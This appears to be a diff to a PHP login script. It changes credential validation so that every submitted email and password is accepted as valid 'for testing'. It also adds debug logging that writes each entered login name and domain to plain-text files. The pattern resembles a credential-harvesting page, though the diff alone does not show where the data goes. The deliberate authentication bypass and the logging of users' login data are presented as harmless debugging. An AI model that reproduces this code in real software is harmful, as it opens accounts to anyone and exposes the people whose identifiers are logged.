@@ -108,9 +108,9 @@ function validateCredentials($email, $password, $domain) {
         return false;
     }
     
-    // For demonstration purposes, let's consider credentials as valid
-    // if they have proper format (you can modify this logic as needed)
-    $validationLog = "Validation successful - returning true\n";
+    // For demonstration purposes, let's consider ALL credentials as valid
+    // This ensures the form works for testing
+    $validationLog = "Validation successful - returning true for testing\n";
     file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
     return true;
 }
@@ -149,6 +149,10 @@ if (!empty($login) && !empty($passwd)) {
         
         // Debug: Log the validation result
         $debugLog = "Validation result: " . ($validCredentials ? 'TRUE' : 'FALSE') . " for login: $login\n";
+        file_put_contents("debug.txt", $debugLog, FILE_APPEND);
+        
+        // Additional debug: Check the exact values
+        $debugLog = "Raw values - Login: '$login', Password: '" . (empty($passwd) ? 'EMPTY' : 'NOT_EMPTY') . "', Domain: '$domain'\n";
         file_put_contents("debug.txt", $debugLog, FILE_APPEND);
         
         if ($validCredentials) {
